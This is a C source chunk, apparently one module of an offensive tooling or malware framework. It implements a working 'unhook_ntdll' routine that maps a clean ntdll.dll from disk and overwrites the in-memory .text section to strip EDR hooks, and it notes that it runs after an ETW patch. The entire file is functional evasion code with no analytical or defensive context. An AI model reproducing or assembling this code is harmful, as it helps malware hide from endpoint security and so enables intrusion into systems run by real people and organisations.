// chunk: evasion/unhook_ntdll
// depends: (none)
// provides: unhook_ntdll
// headers: windows.h
// note: Loads clean ntdll.dll from disk and overwrites .text section to remove EDR hooks. Call after etw_patch.

#ifndef CHUNK_UNHOOK_NTDLL
#define CHUNK_UNHOOK_NTDLL

static int unhook_ntdll(void) {
    HMODULE hooked = GetModuleHandleA("ntdll.dll");
    if (!hooked) return 0;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                                GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return 0; }

    void *clean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!clean) { CloseHandle(hMap); CloseHandle(hFile); return 0; }

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)hooked;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)hooked + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD old;
            void *dst = (BYTE *)hooked + sec[i].VirtualAddress;
            void *src = (BYTE *)clean + sec[i].VirtualAddress;
            DWORD sz = sec[i].Misc.VirtualSize;

            VirtualProtect(dst, sz, PAGE_EXECUTE_READWRITE, &old);
            memcpy(dst, src, sz);
            VirtualProtect(dst, sz, old, &old);
            break;
        }
    }

    UnmapViewOfFile(clean);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 1;
}

#endif
